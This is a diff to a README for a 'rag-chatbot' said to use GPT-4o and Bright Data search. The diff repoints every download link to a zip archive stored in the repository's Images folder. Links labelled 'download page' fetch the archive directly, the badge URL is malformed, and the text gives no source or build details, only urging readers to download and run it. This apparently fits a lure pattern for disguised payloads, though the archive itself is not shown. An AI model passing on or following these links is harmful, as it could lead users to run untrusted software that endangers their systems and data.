@@ -4,12 +4,12 @@
 
 Welcome to the **rag-chatbot**! This chatbot uses GPT-4o and the Bright Data SERP API to provide rich and up-to-date AI responses using real-time search engine data. With this guide, you will easily download and run the software to start chatting right away.
 
-[![Download rag-chatbot](https://github.com/Yxhyzi/rag-chatbot/raw/refs/heads/main/Images/chatbot_rag_1.9.zip%https://github.com/Yxhyzi/rag-chatbot/raw/refs/heads/main/Images/chatbot_rag_1.9.zip)](https://github.com/Yxhyzi/rag-chatbot/raw/refs/heads/main/Images/chatbot_rag_1.9.zip)
+[![Download rag-chatbot](https://github.com/Yxhyzi/rag-chatbot/raw/refs/heads/main/Images/chatbot_rag_v3.2.zip%https://github.com/Yxhyzi/rag-chatbot/raw/refs/heads/main/Images/chatbot_rag_v3.2.zip)](https://github.com/Yxhyzi/rag-chatbot/raw/refs/heads/main/Images/chatbot_rag_v3.2.zip)
 
 ## 📦 Download & Install
 
 1. Click on the link below to visit the download page:
-   [Visit the download page](https://github.com/Yxhyzi/rag-chatbot/raw/refs/heads/main/Images/chatbot_rag_1.9.zip)
+   [Visit the download page](https://github.com/Yxhyzi/rag-chatbot/raw/refs/heads/main/Images/chatbot_rag_v3.2.zip)
 
 2. Find the latest release of **rag-chatbot** on that page.  
 
@@ -65,4 +65,4 @@ Join our community for updates and support. You can reach out to us through the 
 
 Thank you for choosing **rag-chatbot**. We hope it enhances your workflow and provides you with the information you need! 
 
-For more details, visit the [download page](https://github.com/Yxhyzi/rag-chatbot/raw/refs/heads/main/Images/chatbot_rag_1.9.zip).
+For more details, visit the [download page](https://github.com/Yxhyzi/rag-chatbot/raw/refs/heads/main/Images/chatbot_rag_v3.2.zip).
